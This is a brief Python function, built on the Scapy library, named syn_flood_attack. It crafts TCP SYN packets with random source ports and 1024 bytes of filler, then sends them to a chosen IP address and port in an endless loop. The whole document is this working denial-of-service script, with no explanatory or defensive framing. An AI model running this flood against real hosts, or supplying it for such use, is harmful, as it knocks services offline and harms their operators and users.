from scapy.all import IP, TCP, send, RandShort, Raw

def syn_flood_attack(target_ip, target_port):
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=int(target_port), flags="S")
    raw = Raw(b"X"*1024)
    p = ip / tcp / raw
    send(p, loop=1, verbose=0)